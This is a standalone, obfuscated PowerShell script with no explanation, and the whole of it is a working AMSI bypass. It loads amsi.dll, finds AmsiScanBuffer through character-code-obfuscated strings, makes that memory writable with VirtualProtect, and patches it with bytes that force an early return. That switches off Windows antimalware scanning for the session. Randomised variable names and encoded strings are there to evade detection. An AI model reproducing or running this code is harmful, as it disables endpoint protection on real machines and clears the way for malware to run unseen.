$kW86Gb = @"
using System;
using System.Runtime.InteropServices;
public class kW86Gb {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr MVThR7Ofc, string hQseK);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr MBfoOWuogUKZ65d4Nh, UIntPtr PaeM9fkBu0I5oT8enK, uint uYM, out uint r4q9dzWns1HSOugp8vk);
}
"@

Add-Type $kW86Gb

$xldx2iM0dTbPmlki40U = [kW86Gb]::LoadLibrary("$(('àmsî.'+'dll').nOrmaLIZE([CHAR]([bYtE]0x46)+[Char](78+33)+[ChaR](114)+[cHAR]([BytE]0x6d)+[char](68*4/4)) -replace [ChAr](92)+[char](112*4/4)+[cHaR]([bytE]0x7b)+[cHAr](77*22/22)+[CHaR]([byte]0x6e)+[CHAR]([ByTe]0x7d))")
$YZS7BFAmxuUM5 = [kW86Gb]::GetProcAddress($xldx2iM0dTbPmlki40U, "$([ChAr](65*27/27)+[CHaR]([BYTe]0x6d)+[cHar](115*66/66)+[ChAR](105*3/3)+[cHaR](83*33/33)+[cHAr]([ByTE]0x63)+[ChAr](97*80/80)+[ChaR]([BYte]0x6e)+[CHAr]([BYte]0x42)+[ChAR]([BYte]0x75)+[ChAR]([bYTe]0x66)+[chAr](102*52/52)+[char]([bYtE]0x65)+[CHaR](94+20))")
$p = 0
[kW86Gb]::VirtualProtect($YZS7BFAmxuUM5, [uint32]5, 0x40, [ref]$p)
$VaB2YVU = "0xB8"
$f1Wt = "0x57"
$_uEkKEc9SkJKw_ = "0x00"
$lnAJVieER = "0x07"
$FMp = "0x80"
$dTTwLDhbMBn49VTX8z86 = "0xC3"
$jj0_vB0Gl = [Byte[]] ($VaB2YVU,$f1Wt,$_uEkKEc9SkJKw_,$lnAJVieER,+$FMp,+$dTTwLDhbMBn49VTX8z86)
[System.Runtime.InteropServices.Marshal]::Copy($jj0_vB0Gl, 0, $YZS7BFAmxuUM5, 6)